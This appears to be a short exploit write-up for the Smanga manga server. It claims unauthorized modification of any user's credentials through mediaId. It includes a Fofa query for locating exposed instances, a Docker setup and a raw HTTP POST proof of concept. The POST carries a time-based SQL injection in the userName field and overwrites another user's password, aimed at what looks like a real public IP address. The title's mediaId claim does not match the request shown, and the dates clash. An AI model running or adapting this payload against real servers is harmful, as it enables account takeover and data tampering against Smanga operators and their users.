#### Unauthorized Modification of User Credentials

**Exploit Title:** Smanga MediaId Unauthorized Modification of User Credentials  
**Date:** 2024-04-01  
**Exploit Author:** Shuo Sheng, Jixin Zhang  

##### Description:

Smanga allows unauthorized modification of any user's credentials through its `mediaId`.

##### Fofa Query:

```
title="smanga"
```

##### Installation via Docker:

```dockerfile
docker run -itd --name smanga \
-p 3333:3306 \
-p 9797:80 \
-v /mnt:/mnt \
-v /route/smanga:/data \
lkw199711/smanga;
```

##### Proof of Concept (PoC):

```http
POST /php/public/index.php/user/update HTTP/1.1
Host: 163.142.38.128:8083
Content-Length: 265
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://163.142.38.128:8083
Referer: http://163.142.38.128:8083/
Accept-Encoding: gzip, deflate, br

userId=9&userName=%3F%27%20and%20sleep%283%29%23&passWord=sssss&editUser=1&editMedia=1&nickName=&registerTime=2025-01-03%2010%3A16%3A39&updateTime=2025-01-03%2010%3A16%3A39&mediaLimit=&targetUserId=10&timestamp=1735899480975&keyword=3c8ba4463f3e5d4dd98e8c0b14f2047f
```

return：user data update success